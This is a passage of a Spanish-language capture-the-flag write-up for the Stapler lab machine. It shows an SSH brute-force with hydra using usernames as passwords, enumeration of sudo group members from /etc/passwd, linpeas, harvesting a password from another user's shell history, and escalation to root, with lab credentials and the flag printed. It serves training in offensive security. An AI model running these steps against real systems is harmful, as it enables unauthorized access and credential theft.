Ya que tenemos una buena lista de posibles usuarios tanto los de wordpress como los de [smb](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/Stapler/Write-up%20Stapler.md#puerto-139--smb) vamos a probar con `hydra` aplicar fuerza bruta. Después de probar unos cuantos usuarios sin éxito, probamos a ver si alguno de los usuarios a tenido la brillante idea (ironía) de utilizar como contraseña su propio nombre de usuario, algo que es muy mala práctica en lo que a seguridad se refiere.

```shell
hydra -L all_users.txt -P all_users.txt ssh://10.10.0.9
```
```output
-- output --

[DATA] max 16 tasks per 1 server, overall 16 tasks, 1600 login tries (l:40/p:40), ~100 tries per task
[DATA] attacking ssh://10.10.0.9:22/
[22][ssh] host: 10.10.0.9   login: SHayslett   password: SHayslett
```


Y efectivamente **SHayslett** a cometido el error de poner su nombre como contraseña.

<br>

![Stapler/Capturas/Pasted image 20241023201729.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/Stapler/Capturas/Pasted%20image%2020241023201729.png)


<br>
<br>
<br>


----



# Escalada de Privilegios


Comprobamos permisos de superusuario

```shell
sudo -l
```
```output
-- output --

Sorry, user SHayslett may not run sudo on stapler
```
<br>

Vemos que no tenemos ningún tipo de permiso, asique vamos a ver que usuarios pertenecen a al grupo sudo ya que es el que nos interesa

```shell
cat /etc/passwd | grep -E 'bash|zsh' | cut -d':' -f1 | xargs groups | grep sudo
```
```output
-- output --

peter : peter adm cdrom sudo dip plugdev lxd lpadmin sambashare
ubuntu : ubuntu adm dialout cdrom floppy sudo audio dip video plugdev netdev lxd
```

**peter** es el usuarios que pertenece al grupo *sudo*.

<br>
<br>

## Linpeas.sh


Transferimos el archivo a la máquina víctima y lanzamos [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) para hacer una búsqueda de posibles vías de escalada de privilegios.

Encontramos en el archivo wp-config.php del que carecia el backup de wordpress al que tuvimos acceso mediante smb las contraseñas de root para la base de datos wordpress.

<br>

![Stapler/Capturas/Pasted image 20241025104147.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/Stapler/Capturas/Pasted%20image%2020241025104147.png?raw=true)

<br>

Podríamos tratar de conectarnos a la base de datos en busca de mas información y credenciales , pero justo después vemos que en el historial de comando de *JKanode*, el cual tiene permiso de lectura para todos los usuarios, que cambio la contraseña para **peter** en el servició ssh y justo ese usuario es el que pertenece al grupo **sudo**

<br>

![Stapler/Capturas/Pasted image 20241025114203.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/Stapler/Capturas/Pasted%20image%2020241025114203.png)


- **peter** : *JZQuyIN5*

<br>

Cambiamos al usuario peter 

```shell
su peter
```
```output
-- output --

This is the Z Shell configuration function for new users,
zsh-newuser-install.
You are seeing this message because you have no zsh startup files
(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
~).  This function can help you with a few settings that should
make your use of the shell easier.

You can:

(q)  Quit and do nothing.  The function will be run again next time.

(0)  Exit, creating the file ~/.zshrc containing just a comment.
     That will prevent this function being run again.

(1)  Continue to the main menu.

(2)  Populate your ~/.zshrc with the configuration recommended
     by the system administrator and exit (you will need to edit
     the file by hand, if so desired).

--- Type one of the keys in parentheses --- 
```


Seleccionamos la *opción 2*, y una vez dentro del usuario peter solo tenemos que ejecutar el comando `sudo su` para convertirnos en **root**.

<br>

Nos dirigimos al directorio de `/root` y ya tenemos la flag

![Stapler/Capturas/Pasted image 20241025113358.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/Stapler/Capturas/Pasted%20image%2020241025113358.png)

<br>

**Flag** : *b6b545dc11b7a270f4bad23432190c75162c4a2b*

